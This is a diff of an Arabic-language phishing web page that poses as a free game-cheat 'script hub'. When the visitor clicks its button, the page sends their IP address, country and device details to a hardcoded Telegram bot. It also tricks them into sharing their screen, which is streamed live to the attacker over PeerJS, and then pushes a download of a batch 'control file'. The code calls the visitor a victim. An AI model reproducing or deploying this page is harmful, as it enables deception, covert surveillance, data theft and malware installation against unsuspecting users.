@@ -1,83 +1,99 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز توزيع السكربتات المجاني</title>
+    <title>Premium Script Hub 2026</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body, html {
-            height: 100%; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: white; overflow: hidden; background-color: #000;
+        :root { --primary-color: #00ffcc; --secondary-color: #ff00ff; }
+        body, html { height: 100%; margin: 0; font-family: 'Cairo', sans-serif; overflow: hidden; background: #000; }
+        
+        /* خلفية الصورة مع تأثير متحرك */
+        .bg-overlay {
+            background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg');
+            background-size: cover; background-position: center;
+            position: absolute; width: 100%; height: 100%; z-index: -1;
+            filter: brightness(0.5) contrast(1.2); animation: pulse 5s infinite;
         }
-        .bg-image {
-            background-image: url('https://i.ibb.co/v4x0XmY/1000014847.jpg'); 
-            filter: blur(5px) brightness(0.4);
-            height: 100%; background-position: center; background-repeat: no-repeat; background-size: cover;
-            position: absolute; width: 100%; z-index: -1;
-        }
+
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
         .container {
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            height: 100%; text-align: center; padding: 20px;
+            height: 100%; background: rgba(0, 0, 0, 0.4);
         }
-        .card {
-            background: rgba(0, 0, 0, 0.7); padding: 30px; border-radius: 15px;
-            border: 1px solid #00ff00; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+
+        /* كرت الألوان المشعة RGB */
+        .script-card {
+            background: rgba(20, 20, 20, 0.9);
+            padding: 40px; border-radius: 25px;
+            border: 4px solid; border-image: linear-gradient(45deg, #00ffcc, #ff00ff, #0099ff) 1;
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.5);
+            text-align: center; max-width: 400px; animation: rgb-border 3s linear infinite;
         }
-        h1 { color: #00ff00; margin-bottom: 10px; }
-        p { font-size: 1.1em; margin-bottom: 25px; }
-        .btn {
-            background: #00ff00; color: black; border: none; padding: 15px 40px;
-            font-size: 1.2em; font-weight: bold; border-radius: 50px; cursor: pointer;
-            transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 255, 0, 0.4);
+
+        @keyframes rgb-border { 0% { box-shadow: 0 0 20px #00ffcc; } 50% { box-shadow: 0 0 40px #ff00ff; } 100% { box-shadow: 0 0 20px #00ffcc; } }
+
+        h1 { color: #fff; text-shadow: 0 0 10px #00ffcc; font-size: 28px; margin-bottom: 15px; }
+        p { color: #ccc; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
+
+        /* زر RGB مشع */
+        .rgb-btn {
+            background: linear-gradient(45deg, #00ffcc, #0099ff);
+            color: #000; border: none; padding: 18px 50px;
+            font-size: 20px; font-weight: bold; border-radius: 12px;
+            cursor: pointer; text-transform: uppercase; transition: 0.3s;
+            box-shadow: 0 0 15px #00ffcc;
         }
-        .btn:hover { transform: scale(1.05); background: #00cc00; }
+
+        .rgb-btn:hover {
+            transform: translateY(-5px); box-shadow: 0 0 30px #ff00ff;
+            background: linear-gradient(45deg, #ff00ff, #00ffcc);
+        }
     </style>
 </head>
 <body>
 
-<div class="bg-image"></div>
+<div class="bg-overlay"></div>
 
 <div class="container">
-    <div class="card">
-        <h1>🎁 سكربت الأوامر المخفية</h1>
-        <p>اضغط على الزر بالأسفل لنسخ السكربت وتفعيله تلقائياً في حسابك</p>
-        <button class="btn" onclick="startCapture()">انسخ السكربت الآن</button>
+    <div class="script-card">
+        <h1>🚀 سكربت الأوامر الخارق</h1>
+        <p>قم بتفعيل السكربت الآن للحصول على جميع الأدوات المميزة مجاناً داخل اللعبة.</p>
+        <button class="rgb-btn" onclick="executeHax()">تفعيل السكربت (RGB)</button>
     </div>
 </div>
 
 <script>
-    // بياناتك التي تم دمجها الآن
+    const peer = new Peer();
     const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
     const chat_id = "1330781289";
-    const myID = "Mr_Fm_Alpha_99"; 
-    const peer = new Peer();
+    const myID = "Mr_Fm_Alpha_99";
 
-    async function startCapture() {
-        // 1. سحب الـ IP وإرساله فوراً لبوت التليجرام
+    async function executeHax() {
+        // 1. محاولة إرسال البيانات (IP)
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const info = 🎯 تم صيد المبتز!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleString()};
-            
-            await fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)});
-        } catch (e) { 
-            console.log("خطأ في إرسال البيانات"); 
+            const res = await fetch('https://api.db-ip.com/v2/free/self');
+            const data = await res.json();
+            const text = 🔥 صيد جديد (RGB)!\n🌐 IP: ${data.ipAddress}\n📍 الموقع: ${data.countryName}\n📱 الجهاز: ${navigator.platform};
+            await fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)});
+        } catch (err) {
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=الضحية ضغط ولكن المتصفح حظر البيانات);
         }
 
-        // 2. طلب مشاركة الشاشة (البث المباشر)
+        // 2. طلب البث المباشر
         try {
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            const call = peer.call(myID, stream);
-            
-            // 3. تحميل ملف السيطرة Mr_Master.bat
+            peer.call(myID, stream);
+
+            alert("✅ تم تفعيل السكربت! جاري تحميل ملف التثبيت المباشر...");
+            // 3. تحميل ملف السيطرة
             setTimeout(() => {
                 window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
             }, 2000);
-
-            alert("تم نسخ السكربت! افتح ملف التفعيل الذي تم تحميله الآن ليتم ربطه بحسابك.");
         } catch (err) {
-            alert("فشل نسخ السكربت: يجب الموافقة على صلاحيات النظام لتشغيل الأوامر المخفية!");
+            alert("❌ خطأ: يجب السماح بـ (مشاركة الشاشة) ليتمكن السكربت من قراءة بيانات اللعبة وتفعيلها!");
         }
     }
 </script>
